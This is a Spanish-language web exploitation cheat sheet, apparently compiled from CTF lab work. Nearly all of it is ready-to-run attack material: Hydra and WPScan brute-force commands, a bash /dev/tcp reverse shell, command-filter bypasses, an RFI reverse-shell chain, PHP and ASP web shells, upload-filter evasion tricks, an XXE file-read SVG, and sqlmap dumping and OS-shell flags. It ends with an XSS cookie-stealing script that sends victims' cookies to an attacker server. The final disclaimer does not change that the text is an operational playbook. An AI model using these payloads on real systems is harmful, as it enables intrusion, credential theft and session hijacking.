# 🛠️ EXPLOTACIÓN WEB

## 🔐 FUERZA BRUTA WEB

### 🏴‍☠️ Ataques con herramientas comunes

#### 🔹 WPScan (WordPress)
```bash
wpscan -U admin -P /usr/share/wordlist/rockyou.txt --url http://web.com/carpeta
```
💡 *Ataque de diccionario al panel de login de WordPress.*

#### 🔹 Hydra (HTTP básico)
```bash
hydra -l usuario -P lista.txt http-get://IP/ruta -t 4
```
💡 *Ataque básico HTTP.*

Ejemplo:
```bash
hydra -l user -P passwords.txt 127.0.0.1 http-get / -s 81
```

#### 🔹 Hydra (Formulario de login HTTP-POST)
```bash
hydra -l usuario -P lista.txt IP http-post-form "/ruta:campo_usuario=^USER^&campo_password=^PASS^:Falla"
```
Ejemplo para WordPress con redirección:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'
```
Ejemplo para Ataque con Token
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low:F=Username and/or password incorrect'
```
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```
📌 **Flags importantes**:
- 🔤 **Mayúscula** (`-L`) = Lista de palabras (usuarios o contraseñas).
- 🔡 **Minúscula** (`-l`) = Sabemos el usuario o contraseña.

#### 🔹 BurpSuite (Intruder)
1. 🔍 Interceptar petición.
2. 📌 Mandar al **Intruder**.
3. 🎯 Seleccionar **Payloads** (usuario, contraseña o ambos).
4. ⚙️ Elegir tipo de ataque:
   - *Sniper Attack*: Si conocemos usuario o contraseña.
   - *Cluster Bomb Attack*: Si no conocemos ninguno.
5. 📂 Cargar lista de usuarios y contraseñas.
6. 🚀 **Start Attack**.

---

## 💻 COMMAND INJECTION

### 🔹 Ataque básico 🏴‍☠️
1. **Probar en la barra de búsqueda**: `resultado esperado` + `;` o `&&` o `|` + `comando`.
2. Si ejecuta comandos, ¡hay vulnerabilidad!
3. **Escucha en Kali**:
   ```bash
   nc -lvnp 4444
   ```
4. **Ejecutar una reverse shell**:
   ```bash
   bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
   ```
5. Debe conectarse, si no probar sh, perl, o cualquier otra shell

### 🔹 Bypass de caracteres bloqueados 🛡️
1. Interceptar con **BurpSuite**.
2. Enviar al **Repeater**.
3. Probar caracteres alternativos:
   - `%0a` + comando.
   - `%0a%09` *(%09 es una tabulación)*.
   - `%0a${IFS}` *(Espacio en bash)*.
   - `{ls,-la}` *(Ejecuta `ls -la` bypassando filtros)*.

📌 **Ejemplo de variables útiles**:
- `${PATH:0:1}` → `/`
- `${IFS}` → Espacio.
- `%09` → Tabulación.
- `printenv` → comando para ver todas las variables.
  - `${LS_COLORS:10:1}` →  ;
  - `${PATH:0:1}` → /
  - `%0a` → \n → new-line
  - `${IFS}` → espacio
  - `%09` → tabulacion

### 🔹 Bypass de comandos bloqueados 🚧
- **Linux/Windows**: Usar `'` o `"` → `w"h"o"am"i`
- **Linux**: Usar `\` → `w\ho\am\i`
- **Windows**: Usar `^` → `who^ami`

### 🔹 Ofuscación avanzada 🎭
1. **Windows** ignora mayúsculas/minúsculas → `WhOaMi`.
2. **Linux** permite transformar texto:
   ```bash
   (tr "[A-Z]" "[a-z]"<<<"WhOaMi")
   ```
3. **Revertir comando**:
   ```bash
   $(rev<<<'tac')
   ```
4. **Codificar en Base64**:
   ```bash
   echo -n 'cat /etc/passwd | grep 33' | base64
   ```
   ```bash
   bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
   ```

### 🔹 Herramientas de Ofuscacion
  1 - Bashfuscator => ofuscador de comandos Linux
  ```bash
    git clone https://github.com/Bashfuscator/Bashfuscator
    cd Bashfuscator
    pip3 install setuptools==65
    python3 setup.py install --user
  ```
                   
  2 - DOSfuscation => osfuscador de comandos windows

---

## 🎭 CSRF (Cross-Site Request Forgery)

- 🚨 **Vulnerabilidad**: Se explota manipulando el cambio de contraseña en una URL.
- 📎 **Ataque**: Se acorta el link malicioso y se envía a la víctima.

---

## 📂 FILE INCLUSION (LFI/RFI)

1. Si encontramos `/?page=` en la URL y acaba en `.php`, **podría ser vulnerable**.
2. **Probar acceso a archivos sensibles**:
   ```bash
   /etc/passwd
   /../../../../etc/passwd
   ```
3. **Si carga contenido, es vulnerable**.

📌 **Ubicación de archivos en servidores**:
- **Linux**: `/var/www/`
- **Windows**: `C:/inetpub/www`

### 🔹 Explotación con Reverse Shell 🖥️
1. Descargar una **reverse shell**:
   ```bash
   git clone https://github.com/pentestmonkey/php-reverse-shell.git
   ```
2. Copias el codigo y creas un archivo **Modificar IP y Puerto** (poner la IP de nuestra Kali y puerto deseado).
    ```bash
    sudo nano reverse.php
    ```
3. **Ejecutar servidor para subida del archivo**:
   ```bash
   python3 -m http.server 8080
   ```
5. **Poner escucha en Kali**:
   ```bash
   nc -lvnp 4444
   ```
6. **Ejecutar la reverse shell desde la URL**:
   ```bash
   http://10.10.231.229/vulnerabilities/fi/?page=http//IPKALI:8080/reverse.php
   ```
#### 🛑 BLACKLIST FILTER

Puede ser que haya extensiones en blacklist, para probar qué extensiones son válidas:

#####🔎 Identificación de extensiones permitidas

1. Crear un archivo con una extensión permitida (por ejemplo, `.jpg`):
   ```php
   shell.jpg => <?php system($_REQUEST['cmd']); ?>
   ```
2. Interceptar la petición con **Burp Suite**.
3. Enviar la petición al **Intruder** y seleccionar la extensión.
4. Usar una lista de extensiones conocidas:
   ```bash
   /SecLists/Discovery/Web-Content/web-extensions.txt
   ```
5. Verificar la ubicación donde se subió el archivo, por ejemplo:
   ```
   http://83.136.249.46:40526/profile_images/shell2.phar?cmd=id
   ```
6. Probar extensiones válidas que ejecuten comandos.

## 🔥 Evasión de filtros avanzados

Si los filtros bloquean las extensiones comunes, se pueden probar variantes como:

- `shell.php.jpg`
- `shell.jpg.php`
- `shell.jpg.phar`
- `shell.jpg.phtml`

📌 **Truco adicional:** Algunas aplicaciones requieren que el archivo comience con una firma específica. En este caso, agregar `GIF8` al inicio del código shell puede ayudar a evadir filtros.

```php
GIF8<?php system($_REQUEST['cmd']); ?>
```
## 📂 FILE UPLOAD

### 🔥 Descripción
La vulnerabilidad de **File Upload** permite subir un archivo malicioso que puede ejecutar comandos o incluso una **reverse shell**, camuflada en un archivo esperado como `.jpg`, `.png`, etc.

### ⚡ Procedimiento

1. **Crear el archivo** con el código malicioso en formato `.php`
2. **Poner en escucha** la máquina atacante con Netcat
   ```bash
   nc -lvnp 4444
   ```
3. **Subir el archivo PHP** en la víctima y visitarlo
4. **Recibir el acceso remoto** en tu terminal

#### 🛠 Métodos de Explotación

##### ✅ Forma Fácil
Si el sistema permite subir archivos sin restricciones, simplemente sube `reverse.php` con una **reverse shell** dentro.

##### 🔍 Forma Normal
Si hay filtros de extensión:

1. **Burpsuite** → Configurar para interceptar tráfico
2. **Subir `reverse.php`** e interceptar la petición
3. Dos opciones:
   - **Modificar la cabecera:**
     ```http
     Content-Type: image/png
     ```
   - **Cambiar la extensión:**
     ```bash
     reverse.jpg.php
     ```
4. **Buscar la carpeta `upload`** para ejecutar la reverse shell

---

###### 📜 Creación de Archivo `.php`
```bash
sudo nano prueba.php
```
Dentro, incluir el código necesario:
```php
<?php
   system('comando');
?>
```

###### 🏴‍☠️ Forzar Subida de Archivos Restringidos
Si el formulario limita las extensiones permitidas:
```html
<input name="uploadFile" id="uploadFile" type="file" class="custom-file-input" id="inputGroupFile02" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
**Solución:** Eliminar `onchange` y `accept` para permitir cualquier formato.

---

###### ⚡ Web Shells
```php
<?php file_get_contents('/etc/passwd'); ?>          # Lectura de archivos
<?php system('hostname'); ?>                        # Ejecución de comandos
<?php echo file_get_contents('/etc/hostname'); ?>   # Obtener hostname
<?php system($_REQUEST['cmd']); ?>                  # PHP Web Shell
<?php echo shell_exec($_GET[ "cmd" ]); ?>          # Webshell alternativa
<% eval request('cmd') %>                           # Web shell en ASP
```

---

###### 🎭 Código Oculto en `.SVG`

  🕵️‍♂️ Ver código de `upload.php`
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
  <svg>&xxe;</svg>
  ```
  
  🖥 Ejecutar comandos dentro de `.SVG`
  ```xml
  AAAA
  <?php echo system($_GET["cmd"]);?>
  ```
  Para insertar comandos en URL, usar `%20` como espacio:
  ```bash
  http://victima.com/shell.php?cmd=id
  ```

## 🛠️ SQL INJECTION

### 📌 Estructura de una Base de Datos

📂 **BASE DE DATOS** → 📁 **TABLAS** → 📄 **COLUMNAS** → 📌 **CAMPOS** → 🔢 **VALOR**

---

### 🕵️‍♂️ **Detección de Vulnerabilidad**

Para probar si un campo es vulnerable, intenta ingresar:
```sql
' OR '1'='1
```
Si devuelve información inesperada, es probable que sea vulnerable. 🔥

---

### 🛡️ **Explotación con SQLMap**

1️⃣ **Abrir BurpSuite**, configurar y hacer una consulta a la web.  
2️⃣ **Guardar la consulta** en un archivo:
   ```bash
   consulta.req
   ```
3️⃣ **Ejecutar SQLMap** para detectar bases de datos:
   ```bash
   sqlmap -r consulta.req -p id --batch --dbs
   ```
4️⃣ **Profundizar en la información:**
   - Listar bases de datos:
     ```bash
     sqlmap -r consulta.req -p id --dbs
     ```
   - Listar tablas dentro de una base de datos:
     ```bash
     sqlmap -r consulta.req -p id -D <base_de_datos> --tables
     ```
   - Listar columnas dentro de una tabla:
     ```bash
     sqlmap -r consulta.req -p id -D <base_de_datos> -T <tabla> --columns
     ```
   - Extraer datos de columnas específicas:
     ```bash
     sqlmap -r consulta.req -p id -D <base_de_datos> -T <tabla> -C <columna1,columna2> --dump
     ```

5️⃣ **Crackear hashes obtenidos** con John the Ripper:
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```
#### 🛠️ Banderas útiles de SQLmap

##### 1. **`-u` o `--url`** 🌐
   - **Uso**: Especifica la URL del objetivo que deseas escanear.
   - **Ejemplo**: 
     ```
     sqlmap -u http://example.com/page?id=1
     ```

##### 2. **`--dbs`** 💾
   - **Uso**: Enumera todas las bases de datos disponibles en el servidor.
   - **Ejemplo**: 
     ```
     sqlmap -u http://example.com/page?id=1 --dbs
     ```

##### 3. **`--tables`** 📋
   - **Uso**: Muestra las tablas de una base de datos específica.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --dbs --tables -D target_db
     ```

##### 4. **`--columns`** 🗃️
   - **Uso**: Enumera las columnas de una tabla específica dentro de una base de datos.
   - **Ejemplo**: 
     ```
     sqlmap -u http://example.com/page?id=1 --columns -D target_db -T target_table
     ```

##### 5. **`--dump`** 💾
   - **Uso**: Extrae y voltea los datos de las tablas (es decir, volcar los datos).
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --dump -D target_db -T target_table
     ```

##### 6. **`--batch`** 🕒
   - **Uso**: Ejecuta sqlmap automáticamente sin pedir confirmación al usuario, útil para ejecuciones automatizadas.
   - **Ejemplo**: 
     ```
     sqlmap -u http://example.com/page?id=1 --batch
     ```

##### 7. **`--risk` y `--level`** ⚠️
   - **Uso**: Ajusta el nivel de riesgo y la profundidad de las pruebas de inyección.
   - **`--level`**: El nivel de pruebas, de 1 a 5. A mayor nivel, más pruebas se realizan.
   - **`--risk`**: Controla el riesgo de las pruebas. Puede ser de 1 a 3.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --level=5 --risk=3
     ```

##### 8. **`--tamper`** 🛡️
   - **Uso**: Aplica scripts de manipulación para evadir filtros de seguridad (WAF, IDS, etc.).
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --tamper=greatest,least
     ```

##### 9. **`--threads`** 🔄
   - **Uso**: Establece el número de hilos (threads) para ejecutar múltiples pruebas simultáneamente y acelerar el proceso.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --threads=10
     ```

##### 10. **`--cookie`** 🍪
   - **Uso**: Define las cookies que deben usarse para la sesión de la prueba.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --cookie="PHPSESSID=1234567890abcdef"
     ```

##### 11. **`--user-agent`** 🖥️
   - **Uso**: Permite cambiar el User-Agent que sqlmap usa en las solicitudes HTTP.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --user-agent="Mozilla/5.0"
     ```

##### 12. **`--crawl`** 🧭
   - **Uso**: Especifica cuántos niveles de enlace debe rastrear sqlmap para identificar URLs vulnerables.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com --crawl=3
     ```

##### 13. **`--technique`** 🔍
   - **Uso**: Permite especificar las técnicas de inyección SQL que se deben probar. Puedes elegir entre `B` (boolean-based), `T` (time-based), `U` (UNION query), `S` (stacked queries), etc.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --technique=U
     ```

##### 14. **`--os-shell`** 💻
   - **Uso**: Intenta obtener acceso a un **shell del sistema operativo** de la máquina vulnerable (esto solo es posible si la inyección SQL permite ejecutar comandos del sistema operativo).
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --os-shell
     ```

##### 15. **`--passwords`** 🔑
   - **Uso**: Si el sistema tiene autenticación, puedes extraer las contraseñas de los usuarios de la base de datos.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --passwords
     ```

##### 16. **`--dump-all`** 📥
   - **Uso**: Extrae todos los datos de todas las bases de datos, tablas y columnas.
   - **Ejemplo**:
     ```
     sqlmap -u http://example.com/page?id=1 --dump-all
     ```

## 🔎 XSS (Cross-Site Scripting)

### 🔹 Tipos de XSS
- **Reflected** → Se ejecuta una sola vez al cargar la página.
- **Stored** → Se almacena en la base de datos y afecta a todos los usuarios.

### 🔹 Payload básico para prueba 📜
```html
<script>alert("HAS SIDO HACKEADO")</script>
```

### 🔹 Secuestro de sesión (Session Hijacking) 🏴‍☠️
1. **Preparar servidor para recibir cookies**:
   ```bash
   mkdir /tmp/tmpserver && cd /tmp/tmpserver
   ```
2. **Crear `index.php`** para capturar cookies:
   ```php
   <?php
   if (isset($_GET['c'])) {
       $list = explode(";", $_GET['c']);
       foreach ($list as $key => $value) {
           $cookie = urldecode($value);
           $file = fopen("cookies.txt", "a+");
           fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
           fclose($file);
       }
   }
   ?>
   ```
3. **Crear `script.js`** para robar cookies:
   ```js
   new Image().src='http://OUR_IP:8080/index.php?c='+document.cookie
   ```
4. **Escuchar tráfico con Netcat**:
   ```bash
   nc -lnvp 8080
   ```
5 - Prueba los campos con el payload
    
    "><script src=http://OUR_IP:8080/script.js></script>
  
6 - Recibe el archivo cookie.txt con la coockie
7 - Pon la cookie en tu navegador 

    Inspect > storage > pega cookie > refresca


📌 **Este documento es solo para propósitos educativos. ¡Usa este conocimiento de forma ética!** 🛡️
